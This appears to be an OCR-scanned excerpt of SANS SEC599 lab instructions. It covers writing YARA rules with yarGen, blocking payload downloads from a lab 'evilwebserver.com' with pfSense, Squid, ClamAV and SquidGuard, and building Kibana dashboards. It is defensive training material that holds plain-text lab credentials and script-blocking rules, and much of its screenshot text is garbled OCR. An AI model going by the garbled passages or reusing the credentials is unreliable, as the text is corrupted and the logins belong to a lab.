, I root4Pubuntu02: /homt/s« S99

D X

12. Go into the /tmp/YARA folder Let's move to the /tmp/YARA folder, where we can now write our sample YARA rule! Again in our Putty session, we can do this using the following command:
root@ubuntu02:/home/sec599# cd /tmp/YARA

13. Write a YARA rule

© 2017 Erik Van Buggenhout & Stephen Sims

59

Using your favorite text editor (e.g. nano, vi, ...), develop a YARA rule that uses some of the relevant strings as conditions to detect related samples. If you are unfamiliar with Linux text editors, we advise using nano, as it's an intuitive text editor. You can create a file called EyePyramidrule.yara with nano using the following command :
root@ubuntu02:/tmp/YARA/# nano EyePyramidrule.yara
We will write a rule that will only t rigger when all of t he conditions are met. As conditions, we will use the strings we extracted previously from the Cuckoo report (4 strings). Once the rule is finished, you can press CTRL+X to close nano (you will need to confirm you want to save changes by typing "Y").
For additional guidance on writing the YARA rule, please refer to the courseware material. Please refer to the screenshot for the desired result.
I} rootCubuntu02: / tmp/YARA
GNtJ nano 2 . 5 . 3

14. Test the YARA rule against EyePyramid If you wrote a good YARA rule, it should now match against your EyePyramid.exe
file using the following synax:
root@ubuntu02:/tmp/YARA# yara -s <YOURYARARULE> ./EyePyramid.exe
You can also try running your rule against all samples in our dump directory:
root@ubuntu02:/tmp/YARA# yara -s <YOURYARARULE> ./Dump
This should not return any results, as the samples in our dump directory are of various malware families, but not the one of EyePyramid.exe. Now... That was easy, let's kick it up a notch :)

60

© 2017 Erik Van Buggenhout & Stephen Sims

15. Go into the yarGen folder and read the help menu For the next part of this exercise, we will now use yarGen to automatically generate YARA rules for a malware sample! We will first go into the yarGen-master folder and read the yarGen help file by running the following commands:
root@ubuntu02:/tmp/YARA# cd /home/sec599/yarGen-master
root@ubuntu02:/home/sec599/yarGen-master# python ,/yarGen.py -h
carefully read through the help file to understand how yarGen.py operates. As you can see, it is highly configurable and can scan entire directories for malware samples.

16. Run yarGen against our target malware directory

We will run yarGen against our target malware directory. The command line we will

© 2017 Erik Van Buggenhout & Stephen Sims

61

use is the following:
root@ubuntu02:/home/sec599/ yarGen-master# python ./yarGen.py --nr --excludegood -m /tmp/YARA/target -a sec599student -o generated.yara
The options are the following:
--nr: Do not recursively go through directories --excludegood: Exclude known good strings (yarGen has a built-in dictionary of known-good strings) -m: Target folder that should be analysed for the generation of rules -a: author name -o: output file name
Now, go and grab a coffee... This will take a few minutes!

17. Reviewing our generated rule
The generated rules should be written to the output file. Let's do a sanity check and assess whether the rules look good:

root@ubuntu02:/home/sec599/yarGen-master# nano ./generated.yara

Upon initial analysis, it does appear that the strings extracted by our generator tool appear to be rather suspicious:

-An interesting User-Agent string -A number of registry keys -A SQL query -An HTTP url towards a .exe

It appears yarGen.py has managed to provide us with an interesting set of rules,

62

© 2017 Erik Van Buggenhout & Stephen Sims

let's now run this against our Dump directory to find related samples.
PS: You will also observe that the generated condition this time is a lot more complex. yarGen.py will also match when not all of the strings match!

18. Running the YARA rule against Dump In the final step of this lab, we will now run the YARA rule against the Dump directory, containing a variety of samples from different families:
root@ubuntu02:/home/sec599/yarGen-master# yara generated.yara /tmp/YARA/Dump
This should return 1 matching file beginning with 18c6193... (this is the hash of the file). Let's now assess what strings were matching as well (by using the "-s" flag):
root@ubuntu02:/home/sec599/yarGen-master# yara -s generated.yara /tmp/YARA/Dump
This indicates that the matching sample appears to be related to the one we already identified. The following items appear to be identical:
o A user-agent that is being used by the malware (possibly for C&C communications)
o A number of registry keys o A number of software stacks it appears to target

© 2017 Erik Van Buggenhout & Stephen Sims

63

,.
{} rootCubuntu02:/ home/sec:599/yarGen-masur

D X

64

© 2017 Erik Van Buggenhout & Stephen Sims

, .....
SECS99-2.3: Exercise - Deploying PfSense firewall with Squid & ClamAV
Objective The objective of the lab is to set up a web proxy configuration to stop payloads being downloaded over HTTP(S). We will use a combination of open-source technologies to illustrate our set-up (PFSense, Squid, SquidGuard, ClamAV).
Throughout the exercise, the following steps will be performed: · A walkthrough through the different options of Squid · Attempting to download a variety of payloads using the default Squid configuration · Enabling ClamAV to block known malicious payloads · Using Squid's ACLs to block certain MIME types · Using SquidGuard to block certain filetypes
Scenario Virtual Machines
1. SEC599-C01 - Firewall 2. SEC599-C01 - DomainController 3. SEC599-C01 - Kali 4. SEC599-C01 - Windows02
Exercise 1 : SEC599-2.3
The objective of the lab is to set up a web proxy configuration to stop payloads being downloaded over HTTP(S). We will use a combination of open-source technologies to illustrate our set-up (PFSense, Squid, SquidGuard, ClamAV).
1. Authenticate to Windows As usual, let's connect to our Windows machine using the following credentials:
USERNAME: Nick Fury PASSWORD: Awesomesauce123
2. Log in to the firewall admin page
In this first step, we will authenticate to the pfSense firewall admin page. The web interface has been added as a favourite in the Chrome browser (it is at 192.168.10.1), with the following credentials:
USERNAME: admin PASSWORD: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

65

X

~

C A Notsewre l>ft1'! 192.168.10.1 11\de.,php

W PIS,,- F,,,w· < '(' C·<~OO Sondbo,,

"°""' / Ntss:,s

login r fl.llSP rl S.mples · ew-i,.,

~Sense. COMMUNITY EDITION

e

CJ X

* :

Password
·
3. Explore the PfSense web interface
Pfsense's main interface is easy on the eye and provides a dashboard containing system information, such as the name, version, CPU type, uptime and some other stats. The firewall interfaces are shown on the dashboard as well.
In the toolbar at the top of the interface there are a number of interesting functions, including general system administration, network interface configuration, firewall rulesets (per interface), available services, VPN configuration, status, and diagnostics.
Take your time to browse through the menus to get to know PfSense.

66

© 2017 Erik Van Buggenhout & Stephen Sims

C A Not secure ~ : 192.168.10.1

'tS'Sen e -
<,_, V','J"'I ' ' l O'TIO"'

-·

Status / Dashboard

· ·. - ·

e

0 X

*

-· ·

·

+o

System lnformot1on

Name

pfsense synctechlabs.com

J, 0 0

System

Hyper-V Virtual Machine Sen.>! tfe134<19-7ecl8-11e7·abeb· 00155d018000 Netgate De'Ji<'e 10· fd76fdd99fc45882218f

810S

Vendor American Megalrends Inc. Version 090006 Re,lease Oate 05/23/2012

Version

2.3.4-REl..EASE·pl (amd64) built on fn Jul 14 14 52:43 CDT 2017 FreeBSD 10 3-RELfASE·p19

P11tform
CPU Typ·

The syatem Ison the lale"l version
pfSe<lae lntel(R) Xeon(R) CPU ES-2650 v3 @ 2 30GHz 2 CPUs 1 packag<!{·) x 2 eo<e(s)

Interfaces

J. fiAN
m LAN
mDMZ

"' 1OGbase-T <full~uplex>
"" 1OGba..,_T cfull-duplex>
0 none

d. csoc 0 none

J, 0 0
1010101 192168.10.1 192.168 20 l 192168 30.1

4. Review Squid proxy settings
PfSense allows integration with the proxy that we mentioned before, Squid. Through the Squid package, various proxy features such as caching, anti-virus (using ClamAV), basic ACLs, traffic management, and user authentication can be added. In case extended URL categorization and ACL controls are needed, the SquidGuard package can be added to pfSense as well. All of the proxy settings can be configured through the pfSense user interface.
You can find PfSense's user interface under the Services -> Squid Proxy Server
menu entry.

© 2017 Erik Van Buggenhout & Stephen Sims

67

C A No, SKI.Ore ~ 192168.10.1 ~
'8Sen e .· . . - -
COVr.l·Ja.lf1' tOITION

. ·. . .

Package / Proxy Server. General Settings/ General

e
. . ..

General Remote Cache Local Cache Antivllut ACla Traffic M9ml AuthentJcallon Usera Real Tim6 Sync

Squid General Settings

Enabt. Squ,d Proxy

, Check Lo enable the Squid proxy lmporunt: If unchecked. AU Sqwd . .rviees will be disabled and atopped.

Koep Settings/Data

, I( enabled, tile settings, logs. cache, AV defs and othe< data wdl be preserved acros· package reinstalls lmpottanL If dis abled all ·ott,ngs and data will bo w iped on packogo uninstall/rc,u,,tall,upgrade.

Proxy lnterfac-(a)

LAN - - - - - - - - - - - - - ~·
DMZ
csoc
WAN
The ,n,.rfa.)e{s the proxv 1er>·r w I blna · Un CTRL · IIC'l< 10 select mu11,p1~ 1n1ed11Ce>

Proxy Port

3128 This 12 the port ,i,e prc,,y server will l·sten on O,,foull 3128

C,

X

*

+

5. Squid &amp; SSL interception
When scrolling down in the settings, we can see that the Squid proxy has built-in support for HTTPS / SSL interception. We will not enable it at this time, but we'll come back to the topic of SSL/ TLS interception in day 4 of the course.

'-'"~-r.J 1.p ip :,.r ,;l 1'S ~:.U
Nes,us Home/ log,n · MtS-0 CJ S.-,,pl<s · Ev,n,cl,v.,

SSL Mon In the Middle Filtering

HTTPS/ SSL lntereoptlon

Enable SSL nhMng

SSUMITM Mode

Spire,- \Vhl1"1,st. Bump Olooiv, Sr

fheSSL-MtTM mode determtm-, how'>SL nt~,c~o· ,, t

~ wh,,n "SSL Man Ir, tho M,d,!le f,lto,mg is enabled

r ..falllt Spl¢e w~,tclls~ Burnp Oth,,,-wke Click Info I<>< dmll,. 0

SSL lntar-cepl lnlenac:·(s)
SSL Proxy Port
SSL Proxy Compatibility Mode

LAN _ _ _~ - ~ - - - - - - - ~
cOsMoZc
WAN Th<> intt>fface!·) the pro,v aerve, wdl lnt·rcepl SSt roq~or, on Use CTRL + elicit to ...1,~1 muhiplt, nterfacea
rn,~ 1.s ·he port tt, ~ P'OXl' a-,,,..~ w.U lrst1:n on to mterr--1:-p1 SSl ~l· using tra"'lsp.are-rit pro,y ~rat.att 312Q
Modem
ri..,,.,, 0 T"" compaUbihty mod~ dete·,n,ne, which ciohi,: ... eo .;rd T S ,.,.slO<ls are suppo,tt'd Default Mod~m CIiek lrfo for

DHParams Key Siz.e

2048 (default!
DH pa,amNers ~rp U!<"d ror t~po<ary/ephcm-e-ral Cl"" ("y ei charw;,P.& and i.:nprcwe eecunty by en3blmg th~ uae of OHE c,phe,s

6. Squid log settings By default, the Squid access log is enabled. In the access log, Squid keeps detailed

68

© 2017 Erik Van Buggenhout & Stephen Sims

information of all HTTP & web requests. In a future lab, we will also configure Squid to forward its log to an ELK stack.

Logging Settings

Enable Acc·ss Logging

., Th· wll enable the ae<:ess log Wam1ng: llo NOT enable If ava lablo disk &pac:9 IS low

Log Store Directo<y

/va·/&qu;d/logs
Th, · · · oe<B Im'loga will b" BIOi~. also~ for'°'.], other than th!! Ae<:ees Log 1100.e Oelauft· /Ym/1quidlloga lmport8111: Do NOT 1nch,do IM ttatliog / when ,e1t1119 8 euotom locahOll

Rotate Logs

3
Del-·how mAr<y days ol log!,!e-s wil be kept. Rotall<ln ISdisabled II lelt empty

l09 PagH Denied by SquKIOuard

Mekn It possible lo, Squ1dGuard denied log to be included on Squod log,
0 Cilek Info for de1a,led lnStlUCUonS

7. Squid ACL's In the ACL's menu of Squid, we can configure a few interesting security-related controls:
-Blacklisting of domains -Blocking of user agents -Allowed ports -Blocking of MIME types
Blacklisting of domains one-by-one is of course not viable. We can rely on SquidGuard for a proxy with additional versions that also supports categorization of URLs.

-~if Ces.1-MllOf\ OOfflain!I tMt w.110e Ck)d.e-ctfOI tt'W' USf'JI mai do-Ned IOUH the pro,·,
P\C:eacntm,yon I tf'~etlll'""" YouctntisOUHte-Ql,iWe1~tt110nS

Er'..t <1:cr-=s11Wwt1beblD<.·~""t.'le"'< 11t1oure·-1011Sttnell<OXJ
Pul,rec1'1cMJyon1~~tllr"f' vouune ~sert9.111te~..a
Btodt M!Mf lyptt (~eply Only)

~ . M I( "1)N mo, ~ ,_..,forltie uMR1'1ol "'1! &'lcN<d 10 VH ""'p,;:,J Ult! 10 IIIOCI, fl\'UCl1Cl · -
PIJlucnCfttf}'on·-·- vouuno«>-~,llo,·-'IJttUIOM

..,_S<rll)I

8. Squid ClamAV integration Squid supports a built-in antivirus engine with ClamAV. ClamAV has your typical antivirus settings that can be configured, for example:
o Google safe browsing integration

o Signature / database update frequency

0

© 2017 Erik Van Buggenhout & Stephen Sims

69

As you may remember however, ClamAV also supports YARA rules. We could thus also develop our proper YARA as part of the proxy engine, which could possibly block unknown malware samples from a famility we already know. In the Proxy Server settings, we can select the "Antivirus" menu at the top of the PfSense interface.

Package/ Pro).)' Seiver Anttvtrus / Ant1vtrus

ClamAV Anti Vtrus fntegra11on U· 1ng C ICAP

~fMWMIC)oOCMIC

"nCICC:,Of'm\.~.srr'..ll'l<f1Cil~r. ~~

--kW'Ctll'ftltCMflt.-~IO'°""MIDClaml'I

._"°"' Warn.inc, Only en.bft" thit ii )'OU

wM you .,. ckNn9

0

~~,nar-_.. ...~ttwt'MO. fflie ODHI\I IN"DWN. ~~..,...Kl You - ~ ~cor6o's··M t-.c:1- Drt'C 1ft :;tit ....,.,.~afu!ift1

A'"

~

Clif

o.t:wonui:> · · - - , ~ ra:t- T o ~ ~ c

r.: ~ Ko ·

~~

~~

Rodvoc:t URL

.,., ·wua11t~IMntt!h~int:mtrt0U"tllURL. b ~ t. Lu ··-IO-"'"Cl<l·-'15-/-w.""-. UllL

~ 1 Goo!» So&t 8.--:titM'Q ~
~;wiff~G·!aotw u,e,,ftOffl'le"t.onitDCM.i!w~U\11'"·-t1·on-~s,e,
W · ~ "'-f OV,iOC'I ~·JIT'lf tq,n\C1m 41mcut11 Of RAU

OOtteltlOtJr f

ma It

9. Download malware from www.evilwebserver.com So, let's see how our default Squid proxy settings protect us against malware that is being served over HTTP. We have set up an evil web server at the perfectly camouflaged domain www.evilwebserver.com (Full URL: http://www.evilwebserver.com/samples/).
Try downloading the different payloads and assess how Squid reacts to them! Note that we've added the Evil Web Server samples file as a bookmark in Chrome.

70

© 2017 Erik Van Buggenhout & Stephen Sims

~ Index of 1samp1es
C © www.ev1lwebserver.com s 11ples/

X -

~ PfSense Firewa I <(' Cucicoo Saodbox

Nessus Home / Login 'lr MISP ~ Samples - Ev,..,..ebsc

Index of /samples

Last modified .s.izt De:scription

,.) Parent Duccton-

~ payload dU

201 7-08-11 15:39 5 OK

If] pa\·load.cxc

201 7-08-11 15:37 72K

~ payload hta

2017-08-11 15-38 7 2K

~ payload.is

201 7-08-11 15.37 o

[1) pro·load psl

201 7-08- 11 15:39 3 3K

~ payload ,bs

201 7-08-1115:38 7 2K

[1) pavload reflec11on psl 2017-08-11 15:.JO 2.8K

..J.pacJ1e St1ner at w,n,:~1/websener.com Port 80

10. Enable ClamAV in Squid
Let's now start our ClamAV engine in Squid and assess to what extent the payloads can still be downloaded! Go to the AntiVirus configuration & check the "Enable AV" box. Please also make sure the Enable Manual Configuration is set to "Disabled", as we don't want to make in-depth changes for now!
Once the configuration is set, please click the "Save" configuration button at the bottom of the page.

© 2017 Erik Van Buggenhout & Stephen Sims

71

C A Not secure bffl:!t 192.168.10.1 9 ed,lp~p ·"' 1u Nossu, Homo I log n 11 MJSJ> D Sompla - tv1lwd>s,

e

a X

e. *

Package/ Proxy Server Antiv1rus / Anuvirus

Cl1mAV Anti Virus lntegrohon Uamg C·ICAP

A.CU

Clien,ForwMdOabOIJt

5tndboth~t1.15,1!'1-ra:N-1ncl P~,iO("ftul:· ~.,.·tt!tft5' elrefflift!Q;::,fo,--.-.,.,010(' ·rr.A'I

Gtti-,1:)1~
w.,..tn\1 On.tyeM.ble\tn1dJ(klknowwtw.1you·~dioinv 0
""1 ·e=.·tN>tM!:QUt:,t,;ltlMtt~:.-'yll'IW A(tw,o.n,ccdl=t5-.'"Urf'I onc.c-1:>b!-:10tt~Jt1COPfl~~.;iJ'I ,~ "'.a d~fT"«ll.t$i;~o.J:'·1.ione9111'\ sie\1!'1. ·

Rtdittct URl

11. Restart Squid Proxy Server
On the top right screen of the Proxy server configuration, we can find a small "circular" icon, which is labelled "Restart service". Please click this button, which will restart the Squid proxy server and thus ensure the ClamAV configuration is loaded.
If the description is unclear, please refer to the screenshot attached, where the
label is visible!

Give the firewall 1 or 2 minutes to "catch a breath", as he will now load all of the AV signatures...

~ C A Nots«ure ~ / 192,168.10.1 'p·g «t1lphp1 "',,_ u,c '""""'··"'l&td=O·

ll D ~ PfS<nse F·<Pwoff '(' Codcoo Sondbox

S-plH · Eww.b··

Kil>ffll

N....,, W MISJ>

e

· X

* 0.

Package/ Proxy server. Antrv1rus / An11v1rus
CfamAV Anh-Virus Integration Using C·ICAP

I I R..,m S..V.«
SIK

~fonirMd OptioM

~ wm dt""'"..,"""1,..,ria P r·o n.,·.evr,
iet!e,t wt:an ~ 1 W.'.> to fofw-·ra ,c,Cl,.n1..A\

C _,,-.,

0 WMnin,g: Ont, ~ e thb If you knowWM.I you ·e dOfnO

I\·, ·r.,· 11"1" .,r·")ruf,.,.1¢1111~ 4.~t,«I Q!l'I\ -..or.ftOur.i,_· c!:N~ &nd Octl Sew"

f:,V,,,' f '·C"f '()1.,,. llf,Q:l::,tieecinloi,i'tOl'\~Dire'tlfyr.·~ i&.0,~~NMH
,. cont )o\Ol.:e n, -eooc·tvflt:onfliQut.-tiQll1\f'I -.:a.<1~r""'nueicor."'QarM10t1~ein ~ 1

1Vhft11\lltNs·tQ.Unafh«lr~t-e~~t.Sf' toU'U:I~ bam=- rm~ prO,.,,f'i'.4.l'NOtt:cony~l.., t ~ lt.J·f'"mptytll~l~fk·4'1Jtt$qua;pfS,eriae he:DuUIWU,.
Et'l..... ~~fe8~0..'M'iQkC>PorJ GocgLtSaf~R,o.llf,o~ltlCiuOH ~af11Mo~ aboitt~CSi11f'Stl\atnu,~~,it~,or pc.9,,o-e tourtesofm.lws ~
w...nano TM OptlOtl ~ t o , , ~ .noun, or AW

12. Attempt downloading samples again

72

© 2017 Erik Van Buggenhout & Stephen Sims

Attempt download samples again. What is the new behavior? There should already be a difference, as the .dll and .exe file should should now be blocked. Other payloads however still succeed in passing through our filtering (such as the .hta, .psl, .exe,...)!

e

· X

f-

* : C A Not sec.ure ~ pfsense.targetorg.org <1u1 l_clwam.ph ,, I 111 ~ewwew.<Wt.C,:,m/£.3m~ payload.dll&.source·192.·6.

'"'""°- w Pts....r,....., ':("

0 D SamplN - £-,,1...bu

l<ibo""

- · fl Mis.>

13. Configure MIME type blocking Let's prepare some additional filters and also block MIME types & file types in Squid. For this, we will go into the "ACLs" section of the Squid configuration.
Let's add the following line to the "Block MIME Types (Reply Only)" section:
application/hta
Once the line is added, we can again press the "Save" button. Upon saving the configuration, please relaunch Squid using the "Restart service" circular button at the top-right of the Proxy Server Configuration screen (as we did before).

© 2017 Erik Van Buggenhout & Stephen Sims

73

~ pfsense.synctechlabs.cc X "' 11".de" of ,sa,,.p'es

C A Not secure ~ . 192.168.10.1 In1(,- o,-1,, ""'l?

D Nessus Home/ login -. MISP

Samples - Ev,IY,ebse

Put ,;,a,;r, emry on a r.epara·e 11e ,.,., c11n a ~o use regu <11 e·p """ "

Block MIME Types (Reply Only)

appllcat1on/!}!J!

,1
Enter M 1-/.f iypes thr. wfU ~ bkx~ed for tile u,.,.,s tllat a·e a!Jowed to use ttle proxy Useful t
(app!J<:111 on/)avascnc>.)
Pu: each tntcy on a separeie l,ne Vou cen a so U$e r~u!.,1 expresslOfls

Squid Allowed Ports

ACL SefePons

Th,, is a space-separe!ed fist or·ure oons· in addition 'IO ,Ile l)(edefmt"a o~·a:un st
Oefeut l,st 21 7.l 80 210 280 443 488 563 591 631777901 1025-65535

ACL SSLPotU

This 1s a space-separe1ed list or por.s ;o allow SSL 'CONNECT" ,o in eddiuon to the p·ede'.ne
-Oefaut ~St 443 563

14. Attempt downloading samples again
Let's try downloading the .hta file again... If all goes well, the Squid ACL will kick in
and will prevent access from downloading the file!

Those nasty script types (.psl & .vbs) however still make it through! How can we solve this?

C (D wwwevilwebserver.com ,.,.. Nesws Home/tog,n W MISP D s..mpJes · Ev,;-..,
_a ERROR
~NOW
The requested URL could not be retrieved

e

· X

*

The following error was encountered while trying to retrieve the URL: http;i/www.eyjJwebseryer com/samplPS1paytoad hta
Access Denied.
Access control confiouraoon prevents your request from bf,no allowed at this t,me. Please contact your service prov,der if you feel tlris Is Incorrect.
Your cache admlnistrato, is admln;,loolhost.

15. Introducing SquidGuard string matching

As a less-then-ideal solution, we can also configure SquidGuard, which is a more

74

© 2017 Erik Van Buggenhout & Stephen Sims

fine-grained addition to the normal operation of Squid. We will select "Services-> SquidGuard Proxy Filter" in the PfSense menu.

In the SquidGuard settings, we can create a "Target Category" under the "Target Categories" section.

e

·

C A Notserure ~ , 192.168.10.1 µkg.php1YT1'l =· u1d9~arJ_c,e,,· ,,m1

~ PfSens< foi,wal '-K Cuc~oo Sandbox

Nossv· HO<M / login ~ MISP ~ Samples · Evi1"ebse

,-esen e

-- .

-

,...... '" ..

.. :
I

Package/ "lroxy filter SqurdGuard· Target categories/ Target categories

Name

Desc-nptton

l I Add · n.-,, fttm

16. Adding the regex to SquidGuard
The target category we are creating will have the following options:
Name: scripts Regular expression: .vbsl.psl Redirect mode: int error page Description: scripts
By creating a blocking rule, any URL that matches these regular expressions will be blocked... We call this a less-then-ideal solution, as string-matching is not an intelligent solution (but it is of course better then nothing)! Before moving to the next step, please click the "Save" button to save your changes.

© 2017 Erik Van Buggenhout & Stephen Sims

75

Redo,ect mode

Reduect

Ottcnpuon

sa111:s You lt'ay ~·~ any d~c~L'?n h~t~ ·:>r your ,~r~rtnce
-

17. Configuring the SquidGuard Common ACL
Now, let's make sure SquidGuard is correctly configured to allow all t raffic EXCEPT for the traffic matching our "scripts" category. This can be achieved by setting the Target Rules you can see in the screenshot (under the "Common ACLs" tab)! Once t his has been done, please again save your work by clicking the Save button at the bottom of the page.

f6) p1, -,ync1echi.bs.co- >< '$ 1uodc, .trd Enc< pogo X

~

C A No t ecure ~ 192.168.10.1 p~g_ed,t.ph;: ,m ·squodg\,atd.d·f~t..ml&,d·O

42? P15e,,w <·· .., '(' (;doc, Svdbo,.

l\ eu,a Hom,/ lo!J,n

~liS~ C) S . ~ · Evlwot,..,

-??~.

Sen

~

'

e..

.

* Q. ·

Package / Proxy filter SqutdGuard Common Access Comrol lJst (ACL) / Com~ aaat ia o

G·nual Options
Target RulH List O 0

.....

Do _ _ .,

TOffl'! ..! w-e- tt'.e\Pf00,C"Ol «Jtl1)1>e u me UPL fL-~f" ~t:r.,Qiy!JWIQ·~ ? -Aoo,,st,n jr,f'!KdO':.M fil()t-. vouc.an

.....

AddirHNl- lft IJRL

cneo:r.ssoc.::on Tia~..crhatraot'f?c-,.t onoi,t ~ .t st

18. Enabling SquidGuard &amp; Applying the config
Now let's make sure we apply the configuration and launch SquidGuard! This can be achieved by enabling t he checkbox for "Enable" and pressing the "Apply" button.

76

© 2017 Erik Van Buggenhout & Stephen Sims

<ft! pfsensuynctechl·bs.ct: X <1} sq,.1dGuard Error~ X

~

C A Not secure ~ · 192.168.10.1 'p ·g_..a,1.php'm1I= ;qu,dguard ~rr eod=O

Ne·m11 Home / login w MISP D S.,mples · Ev,1..,.,b><

'clSen e -
(( vw.,,.p, 1 c,,· '~·

-.

--

-. .

Package/ Proxy filter SqutdGuard. General settings/ General settings

· I,

Gonaral Opti ons

En1ble

, C~k 11>· cpt>on to Mable s<1""'Gvatd
1mp«1.an1 ~"e :tt t,c, a~ ~·st one- coteg«yon tN' T-""r;t" Cateqores tdt> oe·o,~ ena0f1t,ri Sef' ,1tis fd. to, details
The Save bunon <1: the bottom of 1h,s pag£ "lu"1 be c ed to sa·,e :onf,gi. auor changes
To activate squidGuard conf1gurahon changes. the Apply button m ust be clicked.
m'.I

lSgu1dGuard 5erv1ce st STOPPED

LOAP Options

LOAPON
,.
19. Reviewing the results of our work... When we now attempt to download either the .vbs or .psl script, we will receive an error warning from the PfSense, indicating this target group (called "scripts") is not allowed and that the request was denied.
Should you still be able to download the .vbs or .psl scripts, this is likely the Chrome cache that is still serving you the file (in this case, it's actually not being downloaded, so Squid cannot intervene). You can do this via the Chrome menu or by using the following keyboard shortcut: CTRL+SHIFT+DELETE.
Well done, now let's go and grab a coffee :)

© 2017 Erik Van Buggenhout & Stephen Sims

77

This page intentionally left blank.

78

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-2.4: Exercise - Developing eye-candy using Kibana
Objective
High-level exercise steps:
· Configure mail sandbox & web proxy (PfSense & Squid) to forward logs to Elasticsearch
· Configure Logstash for correct log parsing · Develop Kibana dashboards for easy visualisation Scenario Virtual Machines
1. SEC599-C01 - DomainController 2. SEC599-C01 - Windows 3. SEC599-C01 - Ubuntu03 4. SEC599-C01 - Firewall 5. SEC599-C01 - Kali
Exercise 1 : SEC599-2.4
1. Authenticate to Windows machine
As we've done multiple t imes, we will first authenticate to our Windows machine using the following credentials:
Username: Nick Fury Password: Awesomesauce123
We will use the Windows host as a base station to connect to & configure our other systems!

2. Explore Kibana web interface
We will now open Chrome and visit the Kibana web interface. Kibana has been added as a bookmark to Chrome. As we are using a self-signed SSL certificate in our lab environment, you will need to accept the SSL/ TLS warning that is presented to you.

It will request credentials, which are the following:

Username: admin Password: sec599

Once loaded, the Kibana interface will ask you to create an index pattern. This is to be expected, as t his is a freshly installed / initialized ELK instance. Remember: Kibana is the part of the ELK stack t hat provides visualization. We cannot however

© 2017 Erik Van Buggenhout & Stephen Sims

79

create an index pattern or visualization, as we currently have no data that is being fed into Logstash & Elasticsearch... We will t hus have to:
o Configure our log sources (in this case mainly our pfSense firewall & Squid) to forward their logs to the ELK stack;
o Configure Logstash to correctly parse the logs and store them in Elasticsearch.
Let's background our Chrome browser and get to work!

[) k,bana

X

e

D X

~

C A Not secure ~ 5./ 192.168.30.16 appfr ~,a.,/ManageMent/k -'l!na rnd 9:00

*

~ PfSc~se F·=a <,( Cuckoo S."dOOY D S.rnple:s · Evif\o.~s, (3 Kibana

Nesws

MISP

l kibana

Manag~ nt / Kl!l.lna

,vba,,.

http<.//192,168.30.16/·pp k1ban.1" m1nag,mcnt/k1bana ~nd"'?_9:0

Index Patterns Saved Objects

,

cc::I
No defautt 1r,d~· pat"=r- You must se:Kt or crea:c one 10 conor.ue,

Configure an index pattern
n order to use K1bana you must configure at lec1st one index pattern. Index patterns are used to ,de wfy the Elasucsec1·ch tnde~ to run search and c1nalytlcs aga1nsL They are also u~eo to ronflg re ·1eld0 lnde)( name or pattern
logstash-
A unable to fetch mapping. Do you have indices matcn1ng the pattern?
Pa,-,crl"< allow fOU to oc·..-e dyram,c 1rdc· ramtt us,rg · asa wilocaro. hamplc logsuist---
Time Filter field name 0

Expand lnoex pattern when searcn1ng [DEPRECATED)

3. Review Logstash configuration files
As we don't want to reinvent the wheel, we are going to use a number of Logstash configuration files that have already been developed by the Internet community (in our case, we obtained them from http://pfelk.3ilson.com/). As indicated in the courseware, many different websites exist that offer this type of resources for free.

If you develop your own Logstash configurations for specific log types we highly
recommend sharing t hese with the community as well!

You can find the Logstash configuration files on the "Day 2 ISO", which is mounted on the Windows machine. We have included the following items on the DVD:
o Logstash configuration files for correct parsing & storing of the PfSense log format using syslog;
o A GeoIP database to allow GeoIP visualizations in Kibana.
Let's start by reviewing the Logstash configuration files!

80

© 2017 Erik Van Buggenhout & Stephen Sims

4. Analyze 01-inputs.conf
The first file is located on the DVD under folder "ELK\Logstash" and is called 01inputs.conf. You can open it by right-clicking and selecting "Edit with Notepad++". Notepad++ is a convenient utiltiy to review a structured text file.
The file is only being used to define the type of logs that will be received by logstash and how they will be received. In our case the type is syslog and we want to collect them by launching listeners on TCP & UDP ports 5140.

SNre

V ltw

> Th,s PC OVO Onve (0:) 01y2 ELK Log<tosh

... C, Su·ch Log,ush

p

Quock1ccH> · Desktop . . Oownloods
Oocumtnts

Nar-

potttm<
C ~ 01 -inputs.conf

.,,#

C ll·pfscnse.conf
~ 30-output>.conf

OatemO<U~

Typ,

8126'2017 4:04 4M S/W:,017~1l0 4M 8'27/2017 ,1;53 AM
S/26/2017 Q:lS .!.M

filt fold., (C,llf F·I·
cor,n, Fm.
CONF Fol·

Sitt
HB
HB IKB

ElK
j, MU'll(
PrMlcge
· v~
ta On.Onve
This PC

.,1 O:\ELK\logstash\Ol ·1nput>.conf · Not· p·d· ·

Fit.. Edrt Sf.arch Vio.w Encoding language
J 0 0

· 01~conro

J eep sysloq scream VJ.a 5110 ~ 1npuc f

1'CI) (

4

eype-> ·sysl09"

l)Or1' -> 5110

6

)

9 t udp ayslol)!I !ICre&a Vl.a S140

1npu1; (

udp

1l

~ype ·> · syslo0·

pore-> 5140

Settings Tools
· t--

Macro
'P

Run Plu91ns Wind0w 1

!!"

:i

1.) ~

I· ·

length : 181 ,nes : 15

ln : IS Col:1 Sel: OfO

Unrx (lF)

UTF-8

INS

5. Analyze 11-pfsense.conf
The second file is also located on the DVD under folder "ELK\Logstash" and is called 11-pfsense.conf. You can open it by right-clicking and selecting "Edit with Notepad++". Notepad++ is a convenient utility to review a structured text file.

We will review the file to undertand how logs are actually being parsed. If you have additional questions on how the configuration works, please feel free to reach out to your instructor, who would be happy to help!
o In the first filter, it will look for all events coming In from 192.168.30.1 (our PfSense firewall). It will use grok patterns to parse the syslog messages that are being sent. Parsing the message bascily means splitting it in different usable fields;

o Afterwards, there's a whole bunch of formatting & cosmetic mutates which are taking place, which are of lesser interest to us;

o Further down in the file, you will notice there are a number of "If"conditions that are being used (mostly validating the value of the "prog"

© 2017 Erik Van Buggenhout & Stephen Sims

81

field), to add tags to events. You will notice for example that one such condition looks for a regular expression containing "squid-1 ", which will then add a tag to the event indicating it's a squid-related event AND apply a grok pattern called "HTTPDCOMBINEDLOG". Th is will ensure our Squid events are properly parsed (e.g. HTTP user-agent, HTTP request method, HTTP response code,...).
Grok is the language logstash uses to convert log lines to structured data
fields. It is rather straightforward!

l [;l' D:\ ELK\Logstash\11-pfsfflse.conf · Notepad1-· File Edit Search ViPIH Encoding Language Settings Tools Macro Run Plugins Window ?

0 X
X

~~

,.,

,. ,. ( ~ -l - :!f ...J~l)Ld:::>I ~ . »

i!l 49 si, 51 ;;2 53
54
ss
56 S"' 58 59 6 61 62 63 6-'J 65
<

add_tag ·> I "openvpn"
it (prog] ·- / squid-1/ I gro k { add_tag 0 > [ "squid"
match·> [ "message", " ' {ffl'TPD_COMBINEDLOG }"
}
date ( match=> I "ti.mestarq,", "UNIX" I
)
if (prog ) -- /Aotpd/ { mutate I
